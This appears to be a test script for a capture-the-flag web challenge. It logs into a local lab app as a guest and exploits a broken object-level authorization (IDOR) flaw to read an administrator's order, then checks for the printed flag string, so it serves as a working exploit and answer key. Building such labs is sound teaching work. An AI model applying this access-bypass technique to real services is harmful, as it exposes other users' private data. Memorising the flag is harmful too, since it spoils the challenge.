"""Stage 2: WEB-01 — Insecure Ledger (BOLA / IDOR)."""
import requests

BASE_URL = "http://localhost"

def test_stage_2_flag():
    session = requests.Session()
    # Log in with guest credentials
    login_resp = session.post(f"{BASE_URL}/login", json={"username": "guest", "password": "guest123"}, timeout=5)
    assert login_resp.status_code == 200

    # Query administrative order #1001 (BOLA flaw)
    order_resp = session.get(f"{BASE_URL}/api/orders?order_id=1001", timeout=5)
    assert order_resp.status_code == 200
    data = order_resp.json()
    assert data["shipping_notes"] == "SLIIT{c4rt_br34ch_1d0r_0rd3r_byp455}"
